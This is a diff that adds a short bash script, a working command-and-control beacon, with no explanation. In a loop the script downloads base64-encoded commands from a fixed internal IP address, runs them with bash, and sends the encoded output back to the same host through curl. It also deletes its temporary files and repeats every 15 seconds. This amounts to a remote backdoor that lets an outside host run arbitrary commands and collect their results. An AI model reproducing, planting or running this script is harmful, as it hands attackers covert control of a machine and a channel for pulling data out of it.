@@ -1,0 +1,17 @@
+#!/bin/bash
+while true; do
+	p=80
+	i=10.0.0.133
+	b=b=`hostname`
+	wget -q http://$i:$p/c?$b -O a1
+	base64 --decode < a1 > a3
+	tr -cd '\11\12\40-\176' < a3 > a2
+	bash -v < a2 > out 2>&1
+	base64 < out > out2
+	tr -d '\n' < out2 > out3
+	d=d=`cat out3`
+	curl -L http://$i:$p/r?$b'&'$d -m 1 2> /dev/null
+	rm a* 2> /dev/null
+	rm out* 2> /dev/null
+	sleep 15
+done;
